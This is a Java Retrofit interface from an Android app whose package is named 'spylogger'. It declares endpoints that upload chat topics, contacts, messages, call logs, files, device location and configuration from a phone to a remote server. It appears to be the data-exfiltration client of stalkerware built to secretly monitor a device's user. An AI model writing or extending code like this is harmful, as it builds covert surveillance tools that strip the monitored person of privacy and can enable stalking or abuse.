package com.gravatasufoca.spylogger.services;

import com.gravatasufoca.spylogger.model.Ligacao;
import com.gravatasufoca.spylogger.model.Mensagem;
import com.gravatasufoca.spylogger.model.Topico;
import com.gravatasufoca.spylogger.vos.ConfiguracaoVO;
import com.gravatasufoca.spylogger.vos.ContatoVO;
import com.gravatasufoca.spylogger.vos.EnvioArquivoVO;
import com.gravatasufoca.spylogger.vos.LocalizacaoVO;
import com.gravatasufoca.spylogger.vos.RespostaRecebimentoVO;
import com.gravatasufoca.spylogger.vos.UsuarioVO;

import java.util.List;

import okhttp3.RequestBody;
import retrofit2.Call;
import retrofit2.http.Body;
import retrofit2.http.Multipart;
import retrofit2.http.POST;
import retrofit2.http.Part;
import retrofit2.http.Path;

/**
 * Created by bruno on 01/12/16.
 */

public interface SendDataInterface {

    @POST("receber/topicos")
    Call<RespostaRecebimentoVO> enviarTopicos(@Body List<Topico> topicos);

    @POST("receber/contatos")
    Call<RespostaRecebimentoVO> enviarContatos(@Body List<ContatoVO> contatos);

    @POST("receber/mensagens")
    Call<RespostaRecebimentoVO> enviarMensagens(@Body List<Mensagem> mensagens);

    @POST("receber/ligacoes")
    Call<RespostaRecebimentoVO> enviarLigacoes(@Body List<Ligacao> ligacoes);

    @Multipart
    @POST("receber/arquivo")
    Call<Boolean> enviarArquivo(@Part("arquivo\"; filename=\"arquivo\" ") RequestBody arquivo, @Part("envioArquivoVo") EnvioArquivoVO envioArquivoVO);

    @POST("fcm/conectado")
    Call<Boolean> enviarAtivo(@Body EnvioArquivoVO envioArquivoVO);

    @POST("receber/arquivo/localizacao")
    Call<Boolean> enviarLocalizacao(@Body LocalizacaoVO envioArquivoVO);

    @POST("receber/configuracao")
    Call<Boolean> enviarConfiguracao(@Body ConfiguracaoVO configuracaoVO);

    @POST("receber/arquivo/existe")
    Call<Boolean> notificarExistencia(@Body EnvioArquivoVO envioArquivoVO);

    @POST("usuario")
    Call<UsuarioVO> inserirUsuario(@Body UsuarioVO usuarioVO);

    @POST("usuario/perfil/{id}/{chave}")
    Call<UsuarioVO> inserirChave(@Path("id") Integer idAparelho, @Path("chave") String chave);

    @POST("receber/send")
    Call<List<Integer>> receberArquivos(@Body EnvioArquivoVO envioArquivoVO);

}
